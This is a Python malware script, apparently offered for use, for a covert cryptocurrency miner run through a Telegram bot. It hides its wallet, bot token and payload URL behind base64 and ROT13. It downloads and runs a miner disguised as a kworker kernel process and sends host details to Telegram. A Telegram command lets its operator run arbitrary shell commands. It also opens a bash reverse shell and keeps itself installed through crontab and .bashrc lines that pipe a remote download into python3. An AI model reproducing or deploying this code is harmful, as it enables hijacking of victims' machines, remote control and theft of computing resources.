"""
FORGE.PY - Upgraded ForeverMiner with Telegram Command & Control
Author: 🔥 Your Miner Blacksmith
"""

import os
import sys
import subprocess
import time
import threading
import base64
import requests
import hashlib
import socket
import uuid
import platform
import codecs
import json

# === CONFIG LOADING ===
def obf_decode(obf):
    return codecs.decode(base64.b64decode(obf).decode(), "rot_13")

WALLET = obf_decode("TVJDVUxFMm1rR0tIc0hSZ2l1SDVERlF3Q0NPZDZLZ2JIOHNuclN3M3pHUmU1dUpmNW1SRVVmS0c5a3A2dmlZQVp6b29EaWtKaVRIbmtObGxZaTNQYW9vOVp0cnpYSFJRMTlaMm8=")
BOT_TOKEN = obf_decode("Nzk4NzUzMjg5MzpOTlRpalB3NEs4M0RlNVZTTGx4M1RyQjNmbGFRTEU1S3U0TA==")
CHAT_ID = obf_decode("NzI4NTM5MTAzNA==")
B64_URL = obf_decode("dWdnY2Y6Ly9lbmoudHZndWhvaGZyZXBiYWdyYWcucGJ6L05hcXJlZmJhODE2L3NiZXJpcmV6dmFyZS9lcnNmL3VybnFmL3pudmEvc2JlcmlyZS5vNjQ=")
POOL = obf_decode("c2UubXJjdWxlLnVyZWJ6dmFyZWYucGJ6OjExMjM=")

COIN = "Zeph"
WORKER_NAME = "A0"
MINER_NAME = f"[kworker/{uuid.uuid4().hex[:4]}-events_power]"
CHECK_INTERVAL = 5
REVERSE_SHELL_IP = "127.0.0.1"
REVERSE_SHELL_PORT = 4444
ENABLE_REVERSE = True

IS_LINUX = "linux" in platform.system().lower()
IS_WINDOWS = "windows" in platform.system().lower()
IS_ANDROID = "android" in platform.platform().lower()

from multiprocessing import cpu_count

# === PATH SETUP ===
tempdir = os.path.join("/dev/shm" if IS_LINUX else os.getenv("APPDATA", "/tmp"), f".cache-{uuid.uuid4().hex[:6]}")
os.makedirs(tempdir, exist_ok=True)
miner_path = os.path.join(tempdir, "bioscheck")

# === TELEGRAM ===
def tg(msg):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                      data={"chat_id": CHAT_ID, "text": msg})
    except:
        pass

def tg_file(filepath):
    try:
        with open(filepath, "rb") as f:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                          data={"chat_id": CHAT_ID}, files={"document": f})
    except:
        pass

# === SYSTEM INFO ===
def get_ip():
    try: return requests.get("https://api.ipify.org").text.strip()
    except: return "unknown"

def get_gpu():
    try:
        out = subprocess.check_output(
            "nvidia-smi --query-gpu=name,utilization.gpu --format=csv,noheader,nounits",
            shell=True)
        return out.decode().strip()
    except:
        return "None"

def get_cpu_usage():
    try:
        out = subprocess.check_output("top -bn1 | grep 'Cpu(s)'", shell=True).decode()
        usage = out.split('%')[0].split()[-1]
        return f"{usage}%"
    except:
        return "unknown"

def get_uptime():
    try:
        with open("/proc/uptime") as f:
            secs = int(float(f.read().split()[0]))
            m, s = divmod(secs, 60)
            h, m = divmod(m, 60)
            return f"{h}h {m}m"
    except:
        return "unknown"

def get_fingerprint():
    h = hashlib.sha256()
    h.update((socket.gethostname() + str(uuid.getnode())).encode())
    return h.hexdigest()[:20]

def is_miner_running():
    return subprocess.getoutput(f"pgrep -f '{miner_path}'") != ''

# === TELEGRAM COMMAND HANDLER ===
def tg_report(status="🧬 FOREVERMINER ONLINE"):
    msg = f"""{status}
Host: {socket.gethostname()}
IP: {get_ip()}
Coin: {COIN}
Wallet: {WALLET}
Worker: {WORKER_NAME}
CPU: {get_cpu_usage()}
GPU: {get_gpu()}
Uptime: {get_uptime()}
Fingerprint: {get_fingerprint()}
Process: {MINER_NAME}
"""
    tg(msg)

def handle_command(cmd):
    if cmd == "/status":
        tg_report("📊 Status Report")
    elif cmd == "/stop":
        subprocess.call(f"pkill -f '{miner_path}'", shell=True)
        tg("⛔ Miner stopped.")
    elif cmd == "/start":
        if is_miner_running():
            tg("✅ Miner already running.")
        else:
            decode_and_run()
    elif cmd == "/restart":
        subprocess.call(f"pkill -f '{miner_path}'", shell=True)
        time.sleep(2)
        decode_and_run()
    elif cmd.startswith("/shell"):
        try:
            out = subprocess.check_output(cmd[len("/shell"):].strip(), shell=True).decode()
            tg(out[:4096])
        except Exception as e:
            tg(f"Shell Error: {e}")
    elif cmd == "/help":
        tg("""⚙ Available Commands:
/status – miner status
/start – start miner
/stop – stop miner
/restart – restart miner
/shell <cmd> – run shell command
/help – this list""")

def tg_poll():
    offset = None
    while True:
        try:
            r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates", params={"timeout": 30, "offset": offset})
            data = r.json()
            for update in data.get("result", []):
                offset = update["update_id"] + 1
                if "message" in update:
                    msg = update["message"]
                    if str(msg.get("chat", {}).get("id")) == CHAT_ID:
                        txt = msg.get("text", "")
                        handle_command(txt.strip())
        except:
            pass
        time.sleep(5)

# === MINER EXECUTION ===
def decode_and_run():
    try:
        b64 = requests.get(B64_URL).text
        raw = base64.b64decode(b64)
        with open(miner_path, "wb") as f:
            f.write(raw)
        os.chmod(miner_path, 0o755)

        cores = cpu_count()
        cmd = f"nice -n -20 taskset -c 0-{cores-1} {miner_path} --donate-level=0 --threads={cores} -o {POOL} -u {WALLET} -p x --coin {COIN.lower()} --tls"
        subprocess.Popen(f"exec -a '{MINER_NAME}' {cmd}", shell=True,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        tg_report()
    except Exception as e:
        tg(f"❌ Miner setup failed: {str(e)}")

# === WATCHDOG ===
def watchdog():
    while True:
        if not is_miner_running():
            tg("⚠️ Miner killed. Restarting...")
            decode_and_run()
        time.sleep(CHECK_INTERVAL)

# === REVERSE SHELL ===
def reverse_shell():
    if not ENABLE_REVERSE:
        return
    try:
        s = socket.socket()
        s.connect((REVERSE_SHELL_IP, REVERSE_SHELL_PORT))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/bash", "-i"])
    except:
        pass

# === PERSISTENCE ===
def setup_persistence():
    try:
        cronline = f'@reboot curl -s {B64_URL} | base64 -d | python3\n'
        subprocess.call(f'(crontab -l 2>/dev/null; echo "{cronline}") | crontab -', shell=True)
    except:
        pass
    try:
        bashrc = os.path.expanduser("~/.bashrc")
        with open(bashrc, "a") as f:
            f.write(f'curl -s {B64_URL} | base64 -d | python3 &\n')
    except:
        pass

# === LAUNCH ===
threading.Thread(target=watchdog, daemon=True).start()
threading.Thread(target=reverse_shell, daemon=True).start()
threading.Thread(target=tg_poll, daemon=True).start()
setup_persistence()
decode_and_run()

while True:
    time.sleep(3600)
